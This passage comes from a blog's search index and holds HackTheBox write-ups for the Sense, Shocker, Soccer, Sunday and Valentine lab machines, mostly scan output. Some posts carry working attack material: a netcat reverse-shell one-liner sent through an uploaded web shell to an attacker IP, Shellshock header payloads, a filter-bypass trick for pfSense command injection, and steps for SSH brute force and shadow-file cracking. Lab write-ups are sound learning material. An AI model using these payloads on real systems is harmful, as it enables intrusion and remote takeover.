https://10.10.10.60/css/] /edit.php (Status: 200) [Size: 6689] /includes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/includes/] /license.php (Status: 200) [Size: 6692] /system.php (Status: 200) [Size: 6691] /status.php (Status: 200) [Size: 6691] /javascript (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/javascript/] /changelog.txt (Status: 200) [Size: 271] /classes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/classes/] /exec.php (Status: 200) [Size: 6689] /widgets (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/widgets/] /graph.php (Status: 200) [Size: 6690] /tree (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/tree/] /wizard.php (Status: 200) [Size: 6691] /shortcuts (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/shortcuts/] /pkg.php (Status: 200) [Size: 6688] /installer (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/installer/] /wizards (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/wizards/] /xmlrpc.php (Status: 200) [Size: 384] /reboot.php (Status: 200) [Size: 6691] /interfaces.php (Status: 200) [Size: 6695] /csrf (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/csrf/] /system-users.txt (Status: 200) [Size: 106] /filebrowser (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/filebrowser/] Login page We see system-users.txt and changelog.txt files Let\u0026rsquo;s check them Foothold/User/Root So based on the notes, we can try rohit:pfsense And we get an access We see the version of the pfsense Googling for the exploits and vulnerabilities resulted in this blog Let\u0026rsquo;s try manually exploit the vulnerability Let\u0026rsquo;s nagivate to vulnerable path Let\u0026rsquo;s test the RCE Success If we carefully read the blog we can see that there are bad chars that we can\u0026rsquo;t use for our payload / and - So we have to find a way to bypass the limitation We can check env and use one of the variables Like HOME which contains / Now we need a - Here we can use printf and use octal representation of -, which is \\55 I didn\u0026rsquo;t try hex or decimal representation, but I think hex should work too \\x2d Let\u0026rsquo;s test it So tried different reverse shell one liners, but had no success Thus, I saw a technique, where you supply a payload to nc and wait for connection Then from target host connect to attack host and pipe the result to interpreter which will execute the payload And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sense/images/sense.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sense/","summary":"Sense Enumeration nmap └─$ nmap -sC -sV 10.10.10.60 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 16:21 BST Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.11s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_http-title: Login |_http-server-header: lighttpd/1.","tags":["HTB"],"title":"[HTB] Machine: Sense"},{"categories":null,"contents":"Shocker Enumeration nmap └─$ nmap -sC -sV 10.10.10.56 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 20:39 BST Nmap scan report for 10.10.10.56 (10.10.10.56) Host is up (0.15s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.10 seconds gobuster the option -f is important, since it will Append / to each request I wasn\u0026rsquo;t able to find anything without that option └─$ gobuster dir -u http://10.10.10.56/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -f =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Add Slash: true [+] Timeout: 10s =============================================================== 2023/06/10 05:47:40 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin/ (Status: 403) [Size: 294] /icons/ (Status: 403) [Size: 292] /server-status/ (Status: 403) [Size: 300] Let\u0026rsquo;s check the content of the cgi-bin └─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50 -x sh,cgi,pl =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/cgi-bin/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: sh,cgi,pl [+] Timeout: 10s =============================================================== 2023/06/10 06:09:48 Starting gobuster in directory enumeration mode =============================================================== /.html.cgi (Status: 403) [Size: 303] /.html.pl (Status: 403) [Size: 302] /.html (Status: 403) [Size: 299] /.html.sh (Status: 403) [Size: 302] /user.sh (Status: 200) [Size: 118] /.htm (Status: 403) [Size: 298] /.htm.cgi (Status: 403) [Size: 302] /.htm.pl (Status: 403) [Size: 301] /.htm.sh (Status: 403) [Size: 301] /. (Status: 403) [Size: 294] /.htaccess (Status: 403) [Size: 303] ... We found user.sh Foothold/User The name of the suggest the Shellshock, CVE-2014-6271 https://en.wikipedia.org/wiki/Shellshock_(software_bug) env x='() { :;}; echo vulnerable' bash -c \u0026quot;echo this is a test\u0026quot; User-Agent header is usually the target We can also test other headers: Cookie, Referer We use echo; to receive response back from server, but RCE still exists without it You can try () { :;}; /bin/ping -c1 10.10.16.3 You will not receive http-response, but will receive ping Notice that we have to use full path of the binary for execution Let\u0026rsquo;s get a reverse shell Root Enumeration for privesc sudo -l GTFOBins Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/shocker/images/shocker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shocker/","summary":"Shocker Enumeration nmap └─$ nmap -sC -sV 10.10.10.56 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 20:39 BST Nmap scan report for 10.10.10.56 (10.10.10.56) Host is up (0.15s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.","tags":["HTB"],"title":"[HTB] Machine: Shocker"},{"categories":null,"contents":"Soccer Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80,9091 -sC -sV 10.10.11.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 11:38 EDT Nmap scan report for www.soccer.htb (10.10.11.194) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src \u0026#39;none\u0026#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Mon, 15 May 2023 15:38:17 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;pre\u0026gt;Cannot GET /\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | HTTPOptions, RTSPRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src \u0026#39;none\u0026#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Mon, 15 May 2023 15:38:18 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;pre\u0026gt;Cannot OPTIONS /\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9091-TCP:V=7.93%I=7%D=5/15%Time=646251FC%P=x86_64-pc-linux-gnu%r(in SF:formix,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r SF:\\n\\r\\n\u0026#34;)%r(drda,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x SF:20close\\r\\n\\r\\n\u0026#34;)%r(GetRequest,168,\u0026#34;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\ SF:nContent-Security-Policy:\\x20default-src\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Op SF:tions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCo SF:ntent-Length:\\x20139\\r\\nDate:\\x20Mon,\\x2015\\x20May\\x202023\\x2015:38:17\\ SF:x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang SF:=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/ SF:head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;Cannot\\x20GET\\x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(HT SF:TPOptions,16C,\u0026#34;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Pol SF:icy:\\x20default-src\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\n SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\ SF:r\\nDate:\\x20Mon,\\x2015\\x20May\\x202023\\x2015:38:18\\x20GMT\\r\\nConnection: SF:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;me SF:ta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;C SF:annot\\x20OPTIONS\\x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(RTSPRequest,16C,\u0026#34;HT SF:TP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-s SF:rc\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x20 SF:text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Mon,\\ SF:x2015\\x20May\\x202023\\x2015:38:18\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;meta\\x20charset=\\\u0026#34;u SF:tf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;Cannot\\x20OPTIONS\\ SF:x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(RPCCheck,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad SF:\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(DNSVersionBindReqTCP,2F SF:,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)% SF:r(DNSStatusRequestTCP,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnect SF:ion:\\x20close\\r\\n\\r\\n\u0026#34;)%r(Help,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(SSLSessionReq,2F,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.90 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/15 11:42:17 Starting gobuster in directory enumeration mode =============================================================== /tiny (Status: 301) [Size: 178] [--\u0026gt; http://soccer.htb/tiny/] Progress: 20713 / 26585 (77.91%)[ERROR] 2023/05/15 11:47:19 [!] parse \u0026#34;http://soccer.htb/error\\x1f_log\u0026#34;: net/url: invalid control character in URL Progress: 26570 / 26585 (99.94%) =============================================================== 2023/05/15 11:48:36 Finished =============================================================== Web Server Foothold Let\u0026rsquo;s try default credentials since we know the application running Let\u0026rsquo;s try uploading file with php extension to get rce It seems like there is a cleanup job, that deletes/moves the uploaded files Thus, I tried adding web shell to existing files But had no success, because the changes were reverted back So now we have a approximately 1 minute window to upload and get our reverse shell before our file gets deleted Prepared payload request beforehand: GET /tiny/uploads/shell.php?cmd=rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|nc+10.10.16.37+6666+\u0026gt;/tmp/f Upload php file and send our request And we get our foothold User Now let\u0026rsquo;s enumerate Let\u0026rsquo;s use linpeas Nothing interesting was found, except another vhost Let\u0026rsquo;s add it to our /etc/hosts and open it Let\u0026rsquo;s check it We see that there are websockets involved in ticket input form So I played around with few basic sqli, but no success I can try using sqlmap but have no idea how to send requests to websocket Luckily there is a great blog about it Thanks to rayhan0x01 Check his blog out Now we can use sqlmap Use the creds dumped by sqlmap and we have our user Root If you ran linpeas before, you probably saw doas binary If search for it\u0026rsquo;s config, you will find that it has permissions for player to run dstat as root Check GTFOBins And get your root ","date":"June 7, 2023","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/soccer/","summary":"Soccer Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80,9091 -sC -sV 10.10.11.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 11:38 EDT Nmap scan report for www.soccer.htb (10.10.11.194) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.","tags":["HTB"],"title":"[HTB] Machine: Soccer"},{"categories":null,"contents":"Sunday Enumeration nmap └─$ nmap -sT -p- -Pn --min-rate 5000 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:09 BST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.094s latency). Not shown: 63025 filtered tcp ports (no-response), 2505 closed tcp ports (conn-refused) PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 515/tcp open printer 6787/tcp open smc-admin 22022/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 142.50 seconds └─$ nmap -sC -sV -p79,111,515,6787,22022 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:37 BST Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.16s latency). PORT STATE SERVICE VERSION 79/tcp open finger? | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where |_finger: No one logged on\\x0D 111/tcp open rpcbind 2-4 (RPC #100000) 515/tcp open printer 6787/tcp open ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Not valid before: 2021-12-08T19:40:00 |_Not valid after: 2031-12-06T19:40:00 | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ 22022/tcp open ssh OpenSSH 7.5 (protocol 2.0) | ssh-hostkey: | 2048 aa0094321860a4933b87a4b6f802680e (RSA) |_ 256 da2a6cfa6bb1ea161da654a10b2bee48 (ED25519) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.93%I=7%D=6/10%Time=64846E88%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,12,\u0026#34;No\\x20one\\x20logged\\x20on\\r\\n\u0026#34;)%r(GetRequest,93,\u0026#34;Login\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2 SF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\ SF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:?\\?\\?\\r\\n\u0026#34;)%r(Help,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\?\\?\\?\\r\\n\u0026#34;)%r(HTTPOptions,93,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\ SF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(RTSPRequest,93,\u0026#34;Login\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2 SF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(SS SF:LSessionReq,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(TerminalServerCookie,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20 SF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 108.42 seconds Web Server We have a finger service, we can try enumerating users Foothold Let\u0026rsquo;s try bruteforcing ssh, since I had no idea where to check next Guess the password or use hydra We\u0026rsquo;re in, the creds are sunny:sunday User Let\u0026rsquo;s enumerate for privesc We have another user: sammy And we have a /backup folder with shadow file Let\u0026rsquo;s crack hashes using hashcat And we have our creds for sammy Root Enumerate for privesc sudo -l Check GTFOBins Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sunday/images/sunday.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sunday/","summary":"Sunday Enumeration nmap └─$ nmap -sT -p- -Pn --min-rate 5000 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:09 BST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.094s latency). Not shown: 63025 filtered tcp ports (no-response), 2505 closed tcp ports (conn-refused) PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 515/tcp open printer 6787/tcp open smc-admin 22022/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 142.","tags":["HTB"],"title":"[HTB] Machine: Sunday"},{"categories":null,"contents":"Valentine Enumeration nmap └─$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Not valid before: 2018-02-06T00:45:25 |_Not valid after: 2019-02-06T00:45:25 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.2.22 (Ubuntu) |_ssl-date: 2023-06-07T18:16:21+00:00; -29s from scanner time. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds gobuster └─$ gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.79 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/07 20:00:19 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 38] /index (Status: 200) [Size: 38] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.79/dev/] /encode (Status: 200) [Size: 554] /encode.php (Status: 200) [Size: 554] /decode.php (Status: 200) [Size: 552] /decode (Status: 200) [Size: 552] /omg (Status: 200) [Size: 153356] /server-status (Status: 403) [Size: 292] Check dev endpoint Check the content of the files We have a note And a key, which could belong to hype user (since the filename indicates it) Foothold/User Both web server host same image and look identical The picture suggests heartbleed So googling resulted: https://heartbleed.com/ https://xkcd.com/1354/ etc. Let\u0026rsquo;s search for exploit Test the exploit We see that 